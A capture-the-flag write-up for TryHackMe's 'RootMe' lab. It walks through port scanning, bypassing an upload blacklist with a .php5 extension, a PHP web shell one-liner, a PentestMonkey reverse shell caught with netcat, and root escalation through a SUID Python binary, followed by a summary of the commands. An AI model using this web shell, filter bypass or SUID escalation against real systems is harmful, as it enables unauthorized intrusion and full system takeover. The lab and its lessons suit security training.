# RootMe - TryHackMe

> **Kill Chain Summary**:
> Port Scanning (Ports 22, 80) -> Directory Brute-Force (`/panel/` and `/uploads/`) -> File Upload Extension Filter Bypass (`.php5`) -> PentestMonkey PHP Reverse Shell Execution -> Foothold as `www-data` -> SUID Binary Enumeration (`/usr/bin/python`) -> Python SUID Privilege Escalation with `-p` Flag -> Root Shell (`root`).

| Property | Value |
| :--- | :--- |
| **Target Name** | RootMe |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Easy |
| **Status** | Rooted |
| **Key Techniques** | Web Enumeration, File Upload Bypass, PHP Reverse Shell, SUID PrivEsc |

---

## 1. Reconnaissance and Enumeration

### 1.1 Port Scanning

A full TCP port scan was executed using Nmap:

```bash
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_10.130.154.136 10.130.154.136
```

![[Pasted image 20260525011228.png]]

**Open Ports:**
- **Port 22:** OpenSSH (SSH)
- **Port 80:** Apache HTTP Server

### 1.2 Web Directory Enumeration

A directory brute-force attack was conducted against the web server using Gobuster:

```bash
gobuster dir -u http://10.130.154.136/ -w /usr/share/wordlists/dirb/common.txt
```

![[Pasted image 20260525011625.png]]

**Identified Endpoints:**
- `/panel/` - Document upload form.
- `/uploads/` - Publicly accessible directory where uploaded files are stored.

The presence of an unauthenticated upload form alongside a publicly accessible target directory indicates a classic file upload attack surface.

---

## 2. Initial Access

### 2.1 File Upload Analysis

Navigating to `http://10.130.154.136/panel/` reveals a file upload interface:

![[Pasted image 20260525011846.png]]

### 2.2 Filter Bypass

An initial attempt to upload a basic PHP web shell (`<?php system($_GET['cmd']); ?>`) named `shell.php` was rejected by the server:

![[Pasted image 20260525012315.png]]

The application implements a blocklist restricting the `.php` file extension.

To bypass this restriction, alternative PHP executable extensions were evaluated (`.php5`, `.phtml`, `.phar`, `.phps`). Renaming the file to `attack.php5` successfully bypassed the filter:

![[Pasted image 20260525012441.png]]
![[Pasted image 20260525012636.png]]

The payload was accepted and made accessible at `http://10.130.154.136/uploads/attack.php5`.

### 2.3 Establishing a Reverse Shell

Initial attempts to spawn a reverse shell via GET parameters on the web shell encountered syntax issues:
- `nc -e /bin/bash`: Failed because the host uses an OpenBSD netcat build lacking the `-e` flag.

![[Pasted image 20260525013955.png]]

- FIFO pipes and Bash one-liners failed due to special character URL decoding anomalies (`&`, `>`, `<`) in standard GET queries.

To ensure stability, a full PentestMonkey PHP reverse shell script was configured with the attacker's IP and port, renamed to `php-reverse-shell.php5`, and uploaded directly via `/panel/`.

Start a Netcat listener on the attack machine:

```bash
nc -lvnp 443
```

Navigate to `http://10.130.154.136/uploads/php-reverse-shell.php5` to trigger execution:

![[Pasted image 20260525015730.png]]

A reverse shell connection is established under the context of `www-data`.

Retrieve the user flag:

```bash
cat /var/www/user.txt
```

```text
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### 3.1 SUID Binary Enumeration

To identify privilege escalation vectors, a search for binaries with the SUID bit set was conducted:

```bash
find / -perm -4000 -type f 2>/dev/null
```

![[Pasted image 20260525022709.png]]

Among standard system utilities, the Python interpreter `/usr/bin/python` possesses the SUID permission bit.

### 3.2 Exploitation: Python SUID Execution

> [!NOTE] Concept: SUID Privilege Maintenance
> Modern shells drop elevated privileges when the effective UID (`euid`) does not match the real UID (`ruid`). When executing a shell through a SUID binary like Python, the `-p` (privileged) flag must be supplied to preserve the effective root UID.

Execute a shell via Python while preserving elevated permissions:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Verify privileges and retrieve the root flag:

```bash
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)

cat /root/root.txt
```

```text
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Nmap Full TCP Scan
sudo nmap -sC -sV -p- -T4 -oA nmap/full_tcp_<IP> <IP>

# Gobuster Directory Fuzzing
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt

# Alternative PHP Extension List for Blacklist Bypasses
# .php3, .php4, .php5, .phtml, .phar, .pht, .phps

# Enumerate SUID Binaries
find / -perm -4000 -type f 2>/dev/null

# Python SUID Root Spawn
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

---

## 5. Key Takeaways and Lessons Learned

1. **Extension Blacklist Limitations:** Blacklists that only target `.php` are routinely bypassed using alternative executable extensions such as `.php5` or `.phtml`. Whitelisting allowed extensions with server-side validation is required for security.
2. **Web Shell vs. Standalone Script:** Relying on single-command web shells via URL parameters can cause encoding issues with complex shell syntax (`&`, `|`, `<`). Uploading a dedicated, pre-configured reverse shell script prevents character corruption.
3. **Privilege Preservation in SUID Binaries:** When exploiting SUID binaries that drop into a shell, always pass the `-p` flag (e.g., `sh -p` or `bash -p`) so that the effective UID is preserved instead of being reset to the real user UID.

---

#tryhackme #linux #easy #web #file-upload #filter-bypass #suid #python #privesc
